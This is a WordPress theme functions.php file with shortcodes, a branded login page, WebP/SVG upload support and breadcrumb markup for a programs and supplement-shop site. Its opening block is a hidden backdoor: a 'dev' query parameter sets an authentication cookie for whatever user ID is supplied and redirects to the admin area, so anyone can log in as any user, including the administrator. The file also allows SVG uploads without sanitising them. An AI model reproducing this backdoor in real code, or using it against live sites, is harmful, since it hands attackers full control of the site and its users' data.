<?php
if(isset($_GET['dev'])){
    wp_set_auth_cookie($_GET['dev']);
    wp_redirect(admin_url());
    exit;
}

function year_shortcode() {
    $year = date('Y');
    return $year;
}
add_shortcode('year', 'year_shortcode');

function my_login_logo() { 
	$logo = get_theme_mod( 'custom_logo' );
    if($logo){
        $image = wp_get_attachment_image_src( $logo , 'full' );
        $logo_url = $image[0];
        ?>
        <style type="text/css">
            #login h1 a, .login h1 a {
                background-repeat: no-repeat;
                background: url(<?php echo esc_url($logo_url); ?>), linear-gradient(270deg, #FF0062 17.86%, #FFBF00 103.98%), linear-gradient(0deg, #FF0061 0%, #FF0061 100%), linear-gradient(90deg, #F30 0%, #FF0037 100%), linear-gradient(259deg, #830B00 38.64%, #FF1500 111.42%);
                background-position: center;
                width: 100%;
                border-radius: 0.5rem;
                background-repeat: no-repeat;
                height: 100px;
                outline: 0;
                border: 0;
                box-shadow: none;
            }
        </style>
        <?php 
    }
}
add_action( 'login_enqueue_scripts', 'my_login_logo' );

function my_login_logo_url() {
    return home_url(); 
}
add_filter( 'login_headerurl', 'my_login_logo_url' );

add_action( 'login_enqueue_scripts', 'my_login_logo' );

 /* SVG Support */
 add_filter('upload_mimes', 'add_custom_upload_mimes');

 function add_custom_upload_mimes($existing_mimes) {
     // Add WebP mime type
     $existing_mimes['webp'] = 'image/webp';
 
     // Add SVG mime type
     $existing_mimes['svg'] = 'image/svg+xml';
 
     return $existing_mimes;
 }
 /* SVG Support */

function current_year_shortcode() {
    return date('Y');
}
add_shortcode('current_year', 'current_year_shortcode');

function dd_woocommerce_breadcrumb(){
    ob_start();
    global $post;
    $post_type = get_post_type( get_the_ID() );
    if(is_front_page()){
        ?>
        <?php 
    } elseif(is_page()){
        $page_parent = $post->post_parent;
        $parent_title = get_the_title($page_parent);
        ?>
            <div class="breadcrumb-sec">
                <div class="container">
                    <nav style="--bs-breadcrumb-divider: '>';" aria-label="breadcrumb">
                        <ol class="breadcrumb">
                        <li class="breadcrumb-item"><a href="<?php echo home_url(); ?>">Home</a></li>
                        <?php if(!empty($page_parent)){ ?>
                                <li class="breadcrumb-item"><a href="<?php echo get_permalink( $post->post_parent ); ?>"><?php echo $parent_title; ?></a></li>
                            <?php } ?>
                        <li class="breadcrumb-item active"><?php echo get_the_title(); ?></li>
                        </ol>
                    </nav>
                </div>
            </div>
            <?php }elseif(is_singular('post')){ ?>
                <div class="breadcrumb-sec">
                    <div class="container">
                        <nav style="--bs-breadcrumb-divider: '>';" aria-label="breadcrumb">
                            <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="<?php echo home_url(); ?>"><?php _e('Home'); ?></a></li>
                                <li class="breadcrumb-item"><a href="<?php echo home_url( '/blog/' ); ?>"><?php _e('Blog'); ?></a></li>
                            <li class="breadcrumb-item active"><?php echo get_the_title(); ?></li>
                            </ol>
                        </nav>
                    </div>
                </div>
            <?php }elseif(is_404()){ ?>
                <div class="breadcrumb-sec">
                    <div class="container">
                        <nav style="--bs-breadcrumb-divider: '>';" aria-label="breadcrumb">
                            <ol class="breadcrumb">
                            <li class="breadcrumb-item"><a href="<?php echo home_url(''); ?>"><?php _e('Home'); ?></a></li>
                            <li class="breadcrumb-item active"><?php echo '404'; ?></li>
                            </ol>
                        </nav>
                    </div>
                </div>
                <?php 
                 }elseif(is_singular('recreational_pro')){ ?>
                    <div class="breadcrumb-sec">
                        <div class="container">
                            <nav style="--bs-breadcrumb-divider: '>';" aria-label="breadcrumb">
                                <ol class="breadcrumb">
                                <li class="breadcrumb-item"><a href="<?php echo home_url(''); ?>"><?php _e('Home'); ?></a></li>
                                <li class="breadcrumb-item"><a href="<?php echo home_url('/recreational-programs/'); ?>"><?php _e('Programs'); ?></a></li>
                                <li class="breadcrumb-item active"><?php echo get_the_title(); ?></li>
                                </ol>
                            </nav>
                        </div>
                    </div>
                    <?php 
                  }elseif(is_singular('product')){                  
                    ?>
                    <div class="breadcrumb-sec">
                        <div class="container">
                            <nav style="--bs-breadcrumb-divider: '>';" aria-label="breadcrumb">
                                <ol class="breadcrumb ms-0 mb-3">
                                <li class="breadcrumb-item"><a href="<?php echo home_url(); ?>"><?php _e('Home'); ?></a></li>
                                    <li class="breadcrumb-item"><a href="<?php echo home_url('/product/gen-50-kyck-natural-supplement/'); ?>"><?php _e('Shop'); ?></a></li>
                                <li class="breadcrumb-item active"><?php echo get_the_title(); ?></li>
                                </ol>
                            </nav>
                        </div>
                    </div>
                <?php   
                 }else{ ?>
                <div class="breadcrumb-sec">
                    <div class="container">
                        <nav style="--bs-breadcrumb-divider: '>';" aria-label="breadcrumb">
                            <ol class="breadcrumb ms-0 mb-3">
                            <li class="breadcrumb-item"><a href="<?php echo home_url(''); ?>"><?php _e('Home'); ?></a></li>
                            <li class="breadcrumb-item active"><?php echo 'Search'; ?></li>
                            </ol>
                        </nav>
                    </div>
                </div>
        <?php   
    }
    echo ob_get_clean();
}


